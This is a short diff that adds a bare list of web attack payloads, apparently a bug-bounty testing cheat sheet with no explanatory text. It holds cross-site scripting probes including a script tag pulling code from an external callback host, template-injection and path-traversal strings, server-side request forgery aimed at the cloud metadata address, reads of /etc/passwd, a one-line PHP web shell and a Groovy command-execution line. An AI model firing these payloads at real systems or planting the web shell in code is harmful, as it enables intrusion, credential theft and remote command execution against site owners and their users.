@@ -1,0 +1,15 @@
+<h1>test1234</h1>
+"><script>alert(1)</script>
+"><script src=https://your-server.xss.ht></script>
+"><img src=x onerror=alert(1)>
+{{7*7}}
+http://169.254.169.254/latest/meta-data/
+file:///etc/passwd
+<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
+<?php system($_GET['cmd']); ?>
+println "cat /etc/passwd".execute().text
+../../../../etc/passwd
+/static../
+%2e%2e%2f
+{"id": 123, "id": 456}
+id=123
